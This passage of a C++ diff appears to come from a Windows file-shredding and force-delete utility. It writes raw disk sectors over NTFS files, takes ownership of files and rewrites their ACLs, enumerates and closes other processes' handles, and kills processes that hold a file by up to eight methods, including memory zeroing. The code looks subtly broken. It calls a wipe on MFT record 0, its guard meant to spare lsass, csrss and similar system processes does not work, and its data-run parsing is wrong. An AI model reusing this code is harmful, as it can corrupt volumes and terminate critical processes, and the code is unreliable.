+        wprintf(L"[DEBUG] NTFS: mftStartLcn=%llu, sectorsPerCluster=%llu, mftStartSector=%llu, recordSize=%u (indicator=%d)\n",
+                (unsigned long long)mftStartLcn, (unsigned long long)diskGeo->sectorsPerCluster,
+                (unsigned long long)mftStartSector, mftRecordSize, (int)mftRecordSizeIndicator);
+        
+        ULONGLONG maxSearchSectors = 128 * 1024 * 1024 / 512;
+        ULONGLONG searchedSectors = 0;
+        
+        while (searchedSectors < maxSearchSectors) {
+            BYTE mftData[1024];
+            if (!ReadSector(driveLetter, mftStartSector + searchedSectors, 2, mftData)) {
+                searchedSectors += 2;
+                continue;
+            }
+            
+            BYTE* record = mftData;
+            
+            WORD signature = *(WORD*)record;
+            if (signature != 0x4649 && signature != 0x4946 && signature != 0x454E) {
+                searchedSectors += 2;
+                continue;
+            }
+            
+            DWORD sequenceNumber = *(DWORD*)(record + 0x0C);
+            if (sequenceNumber == 0) {
+                searchedSectors += 2;
+                continue;
+            }
+            
+            WORD recordFlags = *(WORD*)(record + 0x16);
+            if ((recordFlags & 0x01) == 0) {
+                searchedSectors += 2;
+                continue;
+            }
+            
+            DWORD attrOffset = *(WORD*)(record + 0x14);
+            
+            if (attrOffset < 48 || attrOffset >= mftRecordSize) {
+                attrOffset = 56;
+            }
+            
+                while (attrOffset > 0 && attrOffset < mftRecordSize) {
+                    BYTE* attr = record + attrOffset;
+                    
+                    DWORD attrType = *(DWORD*)attr;
+                    if (attrType == 0xFFFFFFFF || attrType == 0) {
+                        break;
+                    }
+                    
+                    WORD attrLength = *(WORD*)(attr + 4);
+                    if (attrLength == 0 || attrLength > mftRecordSize) {
+                        break;
+                    }
+                    
+                    if (attrType == 0x30) {
+                        wchar_t foundName[256] = {};
+                        WORD contentOffset = *(WORD*)(attr + 0x14);
+                        BYTE nameLength = attr[contentOffset + 0x0A];
+                        
+                        if (nameLength > 0 && nameLength < 256) {
+                            for (BYTE i = 0; i < nameLength; i++) {
+                                foundName[i] = *(wchar_t*)(attr + contentOffset + 0x44 + i * 2);
+                            }
+                        }
+                        
+                        std::wstring foundNameStr(foundName);
+                        std::transform(foundNameStr.begin(), foundNameStr.end(), foundNameStr.begin(), ::toupper);
+                        
+                        if (foundNameStr.empty() || nameLength == 0) {
+                            attrOffset += attrLength;
+                            continue;
+                        }
+                        
+                        if (foundNameStr == fileName) {
+                            
+                            wprintf(L"[DEBUG] MATCH FOUND! File='%s'\n", foundNameStr.c_str());
+                            
+                            if (isDirectory) {
+                                return WipeDirectoryClusters(diskGeo, record, mftRecordSize, bytesPerCluster, mode);
+                            }
+                            
+                            FileLocation fileLoc;
+                            fileLoc.volumeLetter = driveLetter;
+                            fileLoc.startingCluster = 0;
+                            fileLoc.fileSize = 0;
+                            
+                            DWORD dataAttrOffset = *(WORD*)(record + 0x14);
+                            while (dataAttrOffset > 0 && dataAttrOffset < mftRecordSize) {
+                                BYTE* dataAttr = record + dataAttrOffset;
+                                DWORD dataAttrType = *(DWORD*)dataAttr;
+                                WORD dataAttrLength = *(WORD*)(dataAttr + 4);
+                                
+                                if (dataAttrLength == 0 || dataAttrLength > mftRecordSize) {
+                                    break;
+                                }
+                                
+                                if (dataAttrType == 0x80) {
+                                    BYTE* dataRun = dataAttr + dataAttr[0x0A];
+                                    ULONGLONG offset = 0;
+                                    ULONGLONG length = 0;
+                                    
+                                    while (*dataRun != 0) {
+                                        BYTE header = *dataRun;
+                                        BYTE lengthSize = header & 0x0F;
+                                        BYTE offsetSize = (header >> 4) & 0x0F;
+                                        
+                                        ULONGLONG runLength = 0;
+                                        for (BYTE i = 0; i < lengthSize && i < 8; i++) {
+                                            runLength |= ((ULONGLONG)dataRun[1 + i]) << (i * 8);
+                                        }
+                                        
+                                        ULONGLONG runOffset = 0;
+                                        for (BYTE i = 0; i < offsetSize && i < 8; i++) {
+                                            runOffset |= ((ULONGLONG)dataRun[1 + lengthSize + i]) << (i * 8);
+                                        }
+                                        
+                                        if (offsetSize > 0) {
+                                            offset += runOffset;
+                                        }
+                                        else {
+                                            offset = length;
+                                        }
+                                        length += runLength;
+                                        
+                                        dataRun += 1 + lengthSize + offsetSize;
+                                    }
+                                    
+                                    if (length > 0) {
+                                        fileLoc.startingCluster = offset;
+                                        fileLoc.fileSize = length * bytesPerCluster;
+                                        
+                                        for (ULONGLONG i = 0; i < length; i++) {
+                                            fileLoc.clusters.push_back(offset + i);
+                                        }
+                                        
+                                        if (WipeClusters(diskGeo, &fileLoc, mode)) {
+                                            WipeMftRecord(driveLetter, 0);
+                                            return true;
+                                        }
+                                        return false;
+                                    }
+                                }
+                                
+                                dataAttrOffset += dataAttrLength;
+                            }
+                        }
+                    }
+                    
+                    attrOffset += attrLength;
+                }
+            
+            searchedSectors += 2;
+            
+            if (searchedSectors >= maxSearchSectors) {
+                break;
+            }
+        }
+        
+        wprintf(L"[DEBUG] NTFS MFT search completed without finding file\n");
+        
+        return false;
+    }
+    
+    if (isDirectory) {
+        return WipeDirectoryEntry(diskGeo, fileName);
+    }
+    
+    FileLocation fileLoc;
+    if (!GetFileClusters(diskGeo, fileName, &fileLoc)) {
+        return false;
+    }
+    
+    if (fileLoc.clusters.empty()) {
+        return false;
+    }
+    
+    return WipeClusters(diskGeo, &fileLoc, mode);
+}
+
+static bool LowLevelShredFile(const std::wstring& filePath, SecureWipeMode mode) {
+    if (filePath.length() < 3) return false;
+    
+    WCHAR driveLetter = filePath[0];
+    if (driveLetter >= 'a' && driveLetter <= 'z') {
+        driveLetter = driveLetter - 'a' + 'A';
+    }
+    
+    if (driveLetter < 'A' || driveLetter > 'Z') {
+        return false;
+    }
+    
+    if (filePath[1] != ':') {
+        return false;
+    }
+    
+    std::wstring fileName = filePath.substr(filePath.find_last_of(L"\\/") + 1);
+    
+    DiskGeometry diskGeo;
+    if (!GetVolumeInfo(driveLetter, &diskGeo)) {
+        wprintf(L"[DEBUG] GetVolumeInfo failed\n");
+        return false;
+    }
+    
+    wprintf(L"[DEBUG] GetVolumeInfo succeeded: fsType=%d\n", (int)diskGeo.fsType);
+    
+    return LowLevelShredFileWithInfo(driveLetter, fileName, &diskGeo, mode, false);
+}
+
+bool SecureShredFileLowLevel(const std::wstring& path, SecureWipeMode mode, bool deleteAfterWipe) {
+    if (path.empty()) {
+        return false;
+    }
+    
+    std::wcout << L"[底层磁盘粉碎] 仅支持NTFS文件系统" << std::endl;
+    
+    if (path.length() < 3) return false;
+    
+    WCHAR driveLetter = path[0];
+    if (driveLetter >= 'a' && driveLetter <= 'z') {
+        driveLetter = driveLetter - 'a' + 'A';
+    }
+    
+    DiskGeometry diskGeo;
+    if (!GetVolumeInfo(driveLetter, &diskGeo)) {
+        std::wcout << L"[错误] 无法获取卷信息" << std::endl;
+        return false;
+    }
+    
+    if (diskGeo.fsType != DiskFileSystemType::NTFS) {
+        std::wcout << L"[错误] 此功能仅支持NTFS文件系统，当前文件系统不支持" << std::endl;
+        return false;
+    }
+    
+    if (path[1] != ':') {
+        return false;
+    }
+    
+    int physicalDrive = diskGeo.physicalDriveNumber;
+    if (physicalDrive < 0) {
+        std::wcout << L"[错误] 无法确定物理驱动器号" << std::endl;
+        return false;
+    }
+    
+    std::wcout << L"[信息] 物理驱动器: \\\\.\\PhysicalDrive" << physicalDrive << L", 分区: " << diskGeo.partitionNumber << std::endl;
+    
+    NtfsVolume vol;
+    wchar_t volumePath[4] = { driveLetter, L':', L'\\', L'\0' };
+    std::wcout << L"[信息] 正在打开卷: " << volumePath << std::endl;
+    
+    if (!vol.OpenVolume(volumePath)) {
+        std::wcout << L"[错误] 无法打开NTFS卷 (需要管理员权限)" << std::endl;
+        return false;
+    }
+    
+    std::wcout << L"[信息] 卷打开成功" << std::endl;
+    
+    std::string utf8Path;
+    {
+        std::wstring filePath = path.substr(3);
+        if (filePath.empty()) {
+            utf8Path = "\\";
+        } else {
+            if (filePath[0] != '\\') {
+                filePath = L"\\" + filePath;
+            }
+            int len = WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, nullptr, 0, nullptr, nullptr);
+            utf8Path.resize(len - 1);
+            WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, &utf8Path[0], len, nullptr, nullptr);
+        }
+    }
+    
+    uint64_t mftRef;
+    if (!vol.ResolvePath(utf8Path, mftRef)) {
+        std::wcout << L"[错误] 无法解析文件路径: " << path << std::endl;
+        return false;
+    }
+    
+    std::vector<DataRun> runs;
+    uint64_t fileSize;
+    bool isResident;
+    uint16_t flags;
+    if (!vol.GetDataRunsWithFlags(mftRef, runs, fileSize, &isResident, &flags)) {
+        std::wcout << L"[错误] 无法获取文件数据运行列表" << std::endl;
+        return false;
+    }
+    
+    std::wcout << L"[信息] 文件大小: " << fileSize << L" 字节" << std::endl;
+    std::wcout << L"[信息] 数据运行数: " << runs.size() << std::endl;
+    
+    if (isResident) {
+        std::wcout << L"[信息] 常驻文件，数据存储在MFT记录中" << std::endl;
+    }
+    
+    int passes;
+    switch (mode) {
+        case SecureWipeMode::DoD_5220_22_M:
+            passes = 3;
+            break;
+        case SecureWipeMode::GutmannFull:
+            passes = 35;
+            break;
+        case SecureWipeMode::SingleRandom:
+            passes = 1;
+            break;
+        default:
+            passes = 3;
+    }
+    
+    uint64_t bytesPerCluster = vol.GetBytesPerCluster();
+    std::vector<uint8_t> wipeBuffer((size_t)bytesPerCluster);
+    
+    InitializeRandomIfNeeded();
+    
+    uint64_t totalWiped = 0;
+    
+    for (int pass = 0; pass < passes; pass++) {
+        BYTE fillValue = 0x00;
+        
+        if (mode == SecureWipeMode::SingleRandom) {
+            for (size_t i = 0; i < wipeBuffer.size(); i++) {
+                wipeBuffer[i] = static_cast<BYTE>(g_rng() & 0xFF);
+            }
+        }
+        else if (mode == SecureWipeMode::DoD_5220_22_M) {
+            if (pass == 0) fillValue = 0x00;
+            else if (pass == 1) fillValue = 0xFF;
+            else {
+                for (size_t i = 0; i < wipeBuffer.size(); i++) {
+                    wipeBuffer[i] = static_cast<BYTE>(g_rng() & 0xFF);
+                }
+            }
+        }
+        else if (mode == SecureWipeMode::GutmannFull) {
+            static const BYTE gutmannPatterns[35] = {
+                0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
+                0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
+                0x92, 0x49, 0x24, 0x49, 0x92, 0x24, 0x92, 0x49,
+                0x24, 0x92, 0x49, 0x24, 0x49, 0x92, 0x24, 0x92,
+                0x49, 0x24, 0x00
+            };
+            fillValue = gutmannPatterns[pass % 35];
+        }
+        
+        if (mode == SecureWipeMode::DoD_5220_22_M && pass < 2) {
+            memset(wipeBuffer.data(), fillValue, wipeBuffer.size());
+        }
+        else if (mode == SecureWipeMode::GutmannFull) {
+            memset(wipeBuffer.data(), fillValue, wipeBuffer.size());
+        }
+        
+        for (const auto& run : runs) {
+            uint64_t startLcn = run.lcn;
+            uint64_t runLength = run.length;
+            
+            for (uint64_t i = 0; i < runLength; i++) {
+                uint64_t sector = (startLcn + i) * (bytesPerCluster / 512) + vol.GetPartitionStart();
+                
+                if (mode == SecureWipeMode::SingleRandom || 
+                    (mode == SecureWipeMode::DoD_5220_22_M && pass == 2)) {
+                    for (size_t j = 0; j < wipeBuffer.size(); j++) {
+                        wipeBuffer[j] = static_cast<BYTE>(g_rng() & 0xFF);
+                    }
+                }
+                
+                if (!vol.WriteSectors(sector, (uint32_t)(bytesPerCluster / 512), wipeBuffer.data())) {
+                    std::wcout << L"[警告] 写入扇区失败: " << sector << std::endl;
+                }
+                
+                totalWiped += bytesPerCluster;
+            }
+        }
+        
+        std::wcout << L"[进度] 完成第 " << (pass + 1) << L"/" << passes << L" 次覆写" << std::endl;
+    }
+    
+    std::wcout << L"[成功] 底层磁盘粉碎完成，共覆写 " << totalWiped << L" 字节" << std::endl;
+    
+    return true;
+}
+
+std::vector<DWORD> FindProcessesHoldingFileHandle(const std::wstring& filePath) {
+    std::vector<DWORD> holdingPids;
+
+    if (!NtQuerySysInfo) {
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll) {
+            NtQuerySysInfo = (_NtQuerySystemInformationAlt)GetProcAddress(hNtdll, "NtQuerySystemInformation");
+        }
+        if (!NtQuerySysInfo) return holdingPids;
+    }
+
+    ULONG bufferSize = 0x10000;
+    std::vector<BYTE> buffer(bufferSize);
+
+    NTSTATUS status;
+    while ((status = NtQuerySysInfo(16, buffer.data(), bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
+        bufferSize *= 2;
+        buffer.resize(bufferSize);
+    }
+
+    if (!NT_SUCCESS(status)) {
+        return holdingPids;
+    }
+
+    PSYSTEM_HANDLE_INFORMATION_EX handleInfoEx = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer.data());
+
+    DWORD startTime = GetTickCount();
+    DWORD timeout = 5000;
+    std::vector<DWORD> processedPids;
+
+    for (ULONG i = 0; i < handleInfoEx->NumberOfHandles; i++) {
+        if (GetTickCount() - startTime > timeout) {
+            break;
+        }
+
+        SYSTEM_HANDLE& handle = handleInfoEx->Information[i];
+
+        if (handle.ProcessId == 0 || handle.ProcessId == 4) {
+            continue;
+        }
+
+        if (std::find(processedPids.begin(), processedPids.end(), handle.ProcessId) != processedPids.end()) {
+            continue;
+        }
+
+        HANDLE hProcess = ProcessTerminator::OpenProcessEnhanced(handle.ProcessId, PROCESS_DUP_HANDLE);
+        if (!hProcess) {
+            processedPids.push_back(handle.ProcessId);
+            continue;
+        }
+
+        processedPids.push_back(handle.ProcessId);
+
+        HANDLE hDupHandle = NULL;
+        if (DuplicateHandle(hProcess, (HANDLE)(ULONG_PTR)handle.Handle,
+            GetCurrentProcess(), &hDupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+
+            if (GetFileType(hDupHandle) == FILE_TYPE_DISK) {
+                std::vector<wchar_t> pathBuffer(MAX_PATH * 4);
+                DWORD pathLen = GetFinalPathNameByHandleW(hDupHandle, pathBuffer.data(), static_cast<DWORD>(pathBuffer.size()), VOLUME_NAME_DOS);
+                if (pathLen > 0 && pathLen < MAX_PATH * 4) {
+                    std::wstring currentHandlePath = pathBuffer.data();
+                    if (currentHandlePath.find(filePath) != std::wstring::npos ||
+                        filePath.find(currentHandlePath) != std::wstring::npos) {
+                        if (std::find(holdingPids.begin(), holdingPids.end(), handle.ProcessId) == holdingPids.end()) {
+                            holdingPids.push_back(handle.ProcessId);
+                        }
+                    }
+                }
+            }
+            CloseHandle(hDupHandle);
+        }
+        CloseHandle(hProcess);
+    }
+
+    return holdingPids;
+}
+
+void CleanupPathRecursive(const std::wstring& path) {
+    DWORD attributes = GetFileAttributesW(path.c_str());
+    if (attributes == INVALID_FILE_ATTRIBUTES) return;
+
+    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
+        std::wstring searchPath = path + L"\\*";
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            std::vector<std::wstring> subPaths;
+            do {
+                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
+                    continue;
+                subPaths.push_back(path + L"\\" + findData.cFileName);
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+
+            for (const auto& subPath : subPaths) {
+                CleanupPathRecursive(subPath);
+            }
+        }
+
+        DWORD attrs = GetFileAttributesW(path.c_str());
+        if (attrs != INVALID_FILE_ATTRIBUTES) {
+            SetFileAttributesW(path.c_str(), attrs & ~(FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN));
+        }
+        RemoveDirectoryW(path.c_str());
+    }
+    else {
+        if (attributes & (FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_OFFLINE)) {
+            SetFileAttributesW(path.c_str(), attributes & ~(FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_OFFLINE));
+        }
+
+        if (!DeleteFileW(path.c_str())) {
+            HANDLE hFile = CreateFileW(path.c_str(), DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
+                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+            if (hFile != INVALID_HANDLE_VALUE) {
+            // [v5.3 跨版本兼容] FileDispositionInfoEx 是 Win10 1607+ 才支持
+            //   Win7 polyfill 已提供 FileDispositionInfoEx 枚举值(21)与结构体
+            //   Win7 内核不识别该 FILE_INFO_BY_HANDLE_CLASS, 调用返回 ERROR_INVALID_PARAMETER
+            //   Win7 回退: 用 FileDispositionInfo (无 POSIX 语义, 但能完成删除)
+            FILE_DISPOSITION_INFO_EX dispositionInfo = { FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS };
+            if (!SetFileInformationByHandle(hFile, FileDispositionInfoEx, &dispositionInfo, sizeof(dispositionInfo))) {
+                // 回退到 Win7 兼容的 FileDispositionInfo
+                FILE_DISPOSITION_INFO fbInfo = { TRUE };
+                SetFileInformationByHandle(hFile, FileDispositionInfo, &fbInfo, sizeof(fbInfo));
+            }
+                CloseHandle(hFile);
+            }
+        }
+    }
+}
+
+bool ForceDeletePathInternal(const std::wstring& path) {
+    DWORD attributes = GetFileAttributesW(path.c_str());
+    if (attributes == INVALID_FILE_ATTRIBUTES) {
+        DWORD err = GetLastError();
+        return err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND;
+    }
+
+    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
+        std::wstring searchPath = path + L"\\*";
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            std::vector<std::wstring> subPaths;
+            do {
+                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
+                    continue;
+                subPaths.push_back(path + L"\\" + findData.cFileName);
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+
+            for (const auto& subPath : subPaths) {
+                ForceDeletePathInternal(subPath);
+            }
+        }
+
+        SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
+        return RemoveDirectoryW(path.c_str()) != 0 || GetLastError() == ERROR_FILE_NOT_FOUND;
+    }
+    else {
+        SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
+
+        if (DeleteFileW(path.c_str())) {
+            return true;
+        }
+
+        HANDLE hFile = CreateFileW(path.c_str(), DELETE | GENERIC_WRITE,
+            FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
+            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            // [v5.3 跨版本兼容] FileDispositionInfoEx (Win10 1607+) 带 POSIX 语义
+            //   Win7 polyfill 提供类型, Win7 内核不识别自动失败回退
+            FILE_DISPOSITION_INFO_EX dispositionInfo = { FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS };
+            BOOL result = SetFileInformationByHandle(hFile, FileDispositionInfoEx, &dispositionInfo, sizeof(dispositionInfo));
+            if (!result) {
+                // 回退到 Win7 兼容的 FileDispositionInfo
+                FILE_DISPOSITION_INFO fbInfo = { TRUE };
+                result = SetFileInformationByHandle(hFile, FileDispositionInfo, &fbInfo, sizeof(fbInfo));
+            }
+            CloseHandle(hFile);
+            return result || GetLastError() == ERROR_FILE_NOT_FOUND;
+        }
+
+        return GetLastError() == ERROR_FILE_NOT_FOUND;
+    }
+}
+
+bool TerminateProcessesHoldingFile(const std::wstring& filePath, bool useMethods1to8);
+bool CloseTargetFileHandles(const std::wstring& targetPath);
+bool TakeOwnershipAndDeleteMaliciousFile(const std::wstring& filePath);
+
+bool TakeOwnershipRecursive(const std::wstring& path) {
+    EnablePrivilege(SE_TAKE_OWNERSHIP_NAME);
+    EnablePrivilege(SE_RESTORE_NAME);
+    EnablePrivilege(SE_BACKUP_NAME);
+    EnablePrivilege(SE_DEBUG_NAME);
+
+    PSID pOwnerSid = nullptr;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
+        DWORD size = 0;
+        GetTokenInformation(hToken, TokenUser, nullptr, 0, &size);
+        std::vector<BYTE> tokenBuffer(size);
+        PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(tokenBuffer.data());
+        if (GetTokenInformation(hToken, TokenUser, pTokenUser, size, &size)) {
+            pOwnerSid = pTokenUser->User.Sid;
+        }
+        CloseHandle(hToken);
+    }
+
+    if (!pOwnerSid) return false;
+
+    DWORD attributes = GetFileAttributesW(path.c_str());
+    if (attributes == INVALID_FILE_ATTRIBUTES) return true;
+
+    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
+        std::wstring searchPath = path + L"\\*";
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            std::vector<std::wstring> subPaths;
+            do {
+                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
+                    continue;
+                subPaths.push_back(path + L"\\" + findData.cFileName);
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+
+            for (const auto& subPath : subPaths) {
+                TakeOwnershipRecursive(subPath);
+            }
+        }
+    }
+
+    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
+
+    DWORD dwError = GetNamedSecurityInfoW(path.c_str(), SE_FILE_OBJECT,
+        OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
+        nullptr, nullptr, nullptr, nullptr, nullptr);
+
+    if (dwError == ERROR_SUCCESS || dwError == ERROR_FILE_NOT_FOUND ||
+        dwError == ERROR_PATH_NOT_FOUND || dwError == ERROR_ACCESS_DENIED) {
+        SetNamedSecurityInfoW(const_cast<wchar_t*>(path.c_str()), SE_FILE_OBJECT,
+            OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
+            pOwnerSid, nullptr, nullptr, nullptr);
+    }
+
+    EXPLICIT_ACCESSW ea[3] = { 0 };
+    ea[0].grfAccessPermissions = 0x10000000;
+    ea[0].grfAccessMode = GRANT_ACCESS;
+    ea[0].grfInheritance = 0x3;
+    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+    ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
+    ea[0].Trustee.ptstrName = (LPWSTR)pOwnerSid;
+
+    ea[1].grfAccessPermissions = 0x10000000;
+    ea[1].grfAccessMode = GRANT_ACCESS;
+    ea[1].grfInheritance = 0x3;
+    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+    ea[1].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    ea[1].Trustee.ptstrName = (LPWSTR)WinBuiltinAdministratorsSid;
+
+    ea[2].grfAccessPermissions = 0x10000000;
+    ea[2].grfAccessMode = GRANT_ACCESS;
+    ea[2].grfInheritance = 0x3;
+    ea[2].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+    ea[2].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    ea[2].Trustee.ptstrName = (LPWSTR)WinBuiltinUsersSid;
+
+    PACL pDacl = nullptr;
+    if (SetEntriesInAclW(3, ea, nullptr, &pDacl) == ERROR_SUCCESS) {
+        SetNamedSecurityInfoW(const_cast<wchar_t*>(path.c_str()), SE_FILE_OBJECT,
+            DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION,
+            pOwnerSid, nullptr, pDacl, nullptr);
+        LocalFree(pDacl);
+    }
+
+    return true;
+}
+
+bool ForceDeletePath(const std::wstring& path) {
+    if (ForceDeletePathInternal(path)) {
+        return true;
+    }
+
+    TakeOwnershipRecursive(path);
+
+    if (ForceDeletePathInternal(path)) {
+        return true;
+    }
+
+    TerminateProcessesHoldingFile(path, true);
+    CloseTargetFileHandles(path);
+
+    if (ForceDeletePathInternal(path)) {
+        return true;
+    }
+
+    TakeOwnershipRecursive(path);
+    CloseTargetFileHandles(path);
+
+    if (ForceDeletePathInternal(path)) {
+        return true;
+    }
+
+    return TakeOwnershipAndDeleteMaliciousFile(path);
+}
+
+bool TerminateProcessesHoldingFile(const std::wstring& filePath, bool useMethods1to8) {
+    std::vector<DWORD> pids = FindProcessesHoldingFileHandle(filePath);
+    if (pids.empty()) return true;
+
+    std::wcout << L"发现 " << pids.size() << L" 个进程占用文件" << std::endl;
+
+    DWORD startTime = GetTickCount();
+    DWORD timeout = 10000;
+
+    for (DWORD pid : pids) {
+        if (GetTickCount() - startTime > timeout) {
+            std::wcout << L"终止进程超时，跳过剩余进程" << std::endl;
+            break;
+        }
+
+        if (pid == 0 || pid == 4) {
+            std::wcout << L"跳过系统进程 PID " << pid << std::endl;
+            continue;
+        }
+
+        std::wcout << L"正在终止 PID " << pid << L"..." << std::endl;
+
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
+            if (Process32FirstW(hSnapshot, &pe)) {
+                do {
+                    if (pe.th32ProcessID == pid) {
+                        std::wstring procNameW(pe.szExeFile);
+                        if (procNameW == L"System" || procNameW == L"csrss.exe" ||
+                            procNameW == L"wininit.exe" || procNameW == L"services.exe" ||
+                            procNameW == L"lsass.exe" || procNameW == L"winlogon.exe" ||
+                            procNameW == L"explorer.exe") {
+                            std::wcout << L"跳过系统关键进程 " << procNameW.c_str() << std::endl;
+                            CloseHandle(hSnapshot);
+                            continue;
+                        }
+                        break;
+                    }
+                } while (Process32NextW(hSnapshot, &pe));
+            }
+            CloseHandle(hSnapshot);
+        }
+
+        HANDLE hProcess = ProcessTerminator::OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+        if (hProcess) {
+            CloseHandle(hProcess);
+        }
+
+        if (useMethods1to8) {
+            HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnapShot != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
+                if (Process32FirstW(hSnapShot, &pe)) {
+                    do {
+                        if (pe.th32ProcessID == pid) {
+                            std::string procName = WideToNarrow(std::wstring(pe.szExeFile));
+                            bool success = false;
+
+                            success = ProcessTerminator::terminateByProcessName(procName) || success;
+                            if (!success) {
+                                for (int method = 1; method <= 8; method++) {
+                                    switch (method) {
+                                    case 1: success = ProcessTerminator::terminateByProcessName(procName); break;
+                                    case 2: success = ProcessTerminator::terminateBySystemCommand(procName); break;
+                                    case 3: success = ProcessTerminator::terminateByParentChildRelationship(procName); break;
+                                    case 4: success = ProcessTerminator::terminateByDirectMemoryZeroing(procName); break;
+                                    case 5: success = ProcessTerminator::terminateByDebugging(procName); break;
+                                    case 6: success = ProcessTerminator::terminateByPriorityManipulation(procName); break;
+                                    case 7: success = ProcessTerminator::terminateByNativeAPI(procName); break;
+                                    case 8: success = ProcessTerminator::terminateByHandleEnumeration(procName); break;
+                                    }
+                                    if (success) break;
+                                }
+                            }
+                            break;
+                        }
+                    } while (Process32NextW(hSnapShot, &pe));
+                }
+                CloseHandle(hSnapShot);
+            }
+        }
+        else {
+            HANDLE hProcessTerminate = ProcessTerminator::OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcessTerminate) {
+                TerminateProcess(hProcessTerminate, 0);
+                CloseHandle(hProcessTerminate);
+            }
+        }
+
+        Sleep(50);
+    }
+
+    return FindProcessesHoldingFileHandle(filePath).empty();
+}
+
+bool CloseTargetFileHandles(const std::wstring& targetPath) {
+    if (!NtQuerySysInfo) {
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll) {
+            NtQuerySysInfo = (_NtQuerySystemInformationAlt)GetProcAddress(hNtdll, "NtQuerySystemInformation");
+        }
+        if (!NtQuerySysInfo) return false;
+    }
+
+    ULONG bufferSize = 0x10000;
+    std::vector<BYTE> buffer(bufferSize);
+
+    NTSTATUS status;
+    while ((status = NtQuerySysInfo(16, buffer.data(), bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
+        bufferSize *= 2;
+        buffer.resize(bufferSize);
+    }
+
+    if (!NT_SUCCESS(status)) {
+        return false;
+    }
+
+    PSYSTEM_HANDLE_INFORMATION_EX handleInfoEx = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer.data());
+    bool allClosed = true;
+
+    DWORD startTime = GetTickCount();
+    DWORD timeout = 5000;
+    std::vector<DWORD> processedPids;
+
+    for (ULONG i = 0; i < handleInfoEx->NumberOfHandles; i++) {
+        if (GetTickCount() - startTime > timeout) {
+            std::wcout << L"关闭句柄超时，跳过剩余句柄" << std::endl;
+            break;
+        }
+
+        SYSTEM_HANDLE& handle = handleInfoEx->Information[i];
+
+        if (std::find(processedPids.begin(), processedPids.end(), handle.ProcessId) != processedPids.end()) {
+            continue;
+        }
+
+        if (handle.ProcessId == 0 || handle.ProcessId == 4) {
+            continue;
+        }
+
+        HANDLE hTargetProcess = ProcessTerminator::OpenProcessEnhanced(handle.ProcessId, PROCESS_DUP_HANDLE);
